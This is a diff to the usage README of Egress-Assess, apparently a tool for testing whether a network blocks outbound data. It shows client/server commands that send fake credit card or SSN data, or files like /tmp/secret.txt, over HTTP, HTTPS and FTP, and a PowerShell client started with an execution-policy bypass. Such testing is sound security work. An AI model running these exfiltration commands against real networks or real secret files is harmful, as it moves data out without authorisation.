@@ -10,31 +10,41 @@ Works as a client/server model.
 ./Egress-Assess.py --list-datatypes       cc, identity, ssn, ni
 
 - Server
-./Egress-Assess.py --server <payload>
-./Egress-Assess.py --server https
+./Egress-Assess.py --server <payload & options>
+./Egress-Assess.py --server http --server-port 8000
 
 - Client
-./Egress-Assess.py --client <payload & options> --datatype <cc or ssn> --data-size <# in MB> --ip <server>
-./Egress-Assess.py --client https --datatype cc --data-size 10 --ip <server> 
+./Egress-Assess.py --client <payload & options> --ip <server> --datatype <cc or ssn> --data-size <# in MB>
+./Egress-Assess.py --client http --client-port 8000 --ip <server> --file /tmp/secret.txt
+./Egress-Assess.py --client http --client-port 8000 --ip <server> --datatype cc --data-size 5
 
 Transferred data is stored in data/.
 
 Example 2
 - Server
-./Egress-Assess.py --server ftp --username lee --password hack
-
-- Client
-./Egress-Assess.py --client ftp --username lee --password hack --datatype ssn --data-size 10 --ip <server>
-
-Example 3
-- Server
 ./Egress-Assess.py --server https
 
 - Client
-./Egress-Assess.py --client https --file /root/secret.txt --ip <server>
+./Egress-Assess.py --client https --ip <server> --file /tmp/secret.txt
+./Egress-Assess.py --client https --ip <server> --datatype ssn --data-size 5
 
-- PowerShell
+Example 3
+- Server
+./Egress-Assess.py --server ftp --username lee --password hack
+
+- Client
+./Egress-Assess.py --client ftp --username lee --password hack --file /tmp/secret.txt
+./Egress-Assess.py --client ftp --username lee --password hack --datatype identity --data-size 5
+
+- PowerShell version can only be used as a client.
+Its not a one-for-one port. Not all options are the same.
+Be sure to use a single dash instead of a double.
+
 powershell -nop -exec bypass
 Import-Module .\EgressAssess.ps1
-Invoke-EgressAssess <options>
+
+Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype "c:\Users\lee\secret.txt"
+Invoke-EgressAssess -Client http -Port 8000 -IP <server> -Datatype ni -Size 5 -Fast
+
+Invoke-EgressAssess -Client ftp -IP <server> -Username lee -Password hack -Datatype "c:\Users\lee\secret.txt"
 
